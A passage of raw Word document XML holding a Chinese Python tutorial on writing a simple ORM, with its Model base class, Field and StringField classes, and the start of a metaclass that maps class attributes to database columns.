          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象不返回结果集，而是通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>rowcount</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回结果数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06811446" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="320" w:lineRule="exact"/>
        <w:contextualSpacing/>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ORM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F37A74"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有了基本的</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execute()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数，我们就可以开始编写一个简单的</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了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AD7062"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设计</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需要从上层调用者角度来设计。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BD3AF1"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我们先考虑如何定义一个</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对象，然后把数据库表</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和它关联起来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8AF322"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from orm import Model, StringField, IntegerField</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369E596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class User(Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D8E6DC"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__table__ = 'users'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631D7E5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id = IntegerField(primary_key=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8458D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name = StringField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5950573D"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注意到定义在</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类中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>__table__</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id</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name</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是类的属性，不是实例的属性。所以，在类级别上定义的属性用来描述</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对象和表的映射关系，而实例属性必须通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>__init__()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法去初始化，所以两者互不干扰：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2FAF2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w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建实例</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1260406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user = User(id=123, name='Michael')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11931DA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lastRenderedPageBreak/>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>存入数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E5B45C"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user.insert()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4510B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w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>查询所有</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9E96B8"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users = User.findAll()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2108D5B4" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="320" w:lineRule="exact"/>
        <w:contextualSpacing/>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定义</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFB3174"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首先要定义的是所有</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映射的基类</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A531E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class Model(dict, metaclass=ModelMetaclass):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7977D05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__init__(self, **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047FA12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super(Model, self).__init__(**kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F54F91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__getattr__(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E5484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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1323A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self[key]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254BF00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except KeyError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D42EF2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raise AttributeError(r"'Model' object has no attribute '%s'" % key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDDFCD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__setattr__(self, key, value):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E38C0C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self[key] = value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72479C5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getValue(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40462CA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getattr(self, key, None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2B8AD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getValueOrDefault(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247A05D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value = getattr(self, key, None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783FCC1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value is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42869D2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field = self.__mappings__[key]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4146A2C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field.default is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDF7114"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value = field.default() if callable(field.default) else field.default</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1001DC5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logging.debug('using default value for %s: %s' % (key, str(value)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326FBC4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setattr(self, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0397614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value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617C17C4"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Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>从</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>继承，所以具备所有</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的功能，同时又实现了特殊方法</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>__getattr__()</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__setattr__()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，因此又可以像引用普通字段那样写：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A8A9C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&gt;&gt;&gt; user['id']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1185D62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123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5675DCC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&gt;&gt;&gt; user.id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A4929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123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9991AF"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以及</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Field</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和各种</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Field</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>子类：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6476E20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lastRenderedPageBreak/>
        <w:t>class Field(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCB313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__init__(self, name, column_type, primary_key, default):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712AF32C"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self.name = name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BFDF0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self.column_type = column_type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DC4672"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self.primary_key = primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8745A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self.default = default</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F87E106"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__str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD0765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'&lt;%s, %s:%s&gt;' % (self.__class__.__name__, self.column_type, self.name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A592600"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映射</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>varchar</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>StringField</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6913968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class StringField(Field):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F82B2A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__init__(self, name=None, primary_key=False, default=None, ddl='varchar(100)'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440C82F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super().__init__(name, ddl, primary_key, default)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F081BF6"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注意到</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只是一个基类，如何将具体的子类如</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的映射信息读取出来呢？答案就是通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>metaclass</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ModelMetaclass</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65257FFC"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class ModelMetaclass(type):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AABDBA8"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__new__(cls, name, bases, attrs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E16B89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 </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>排除</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类本身</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B341C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name=='Model':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF05F56"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type.__new__(cls, name, bases, attrs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43866ED6"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>table</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>名称</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1756E6A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tableName = attrs.get('__table__', None) or name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDC5A0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logging.info('found model: %s (table: %s)' % (name, tableName))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F75CC6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 </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取所有的</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Field</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和主键名</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7530595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mappings = dict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE1814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fields = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182A677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primaryKey = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD07A8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for k, v in attrs.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F86FC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isinstance(v, Field):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E4A84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logging.info('  found mapping: %s ==&gt; %s' % (k, v))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391902E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mappings[k] = v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F91914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v.primary_key:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7FAC42"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>找到主键</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63003AC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primaryKey:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADC36E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raise RuntimeError('Duplicate primary key for field: %s' % k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D339F8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lastRenderedPageBreak/>
        <w:t xml:space="preserve">                    primaryKey = k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107CB752"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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B91892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fields.append(k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39465D4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not primaryKey:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B753FA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raise RuntimeError('Primary key not found.')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C18328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for k in mappings.keys():</w:t>
      </w:r>
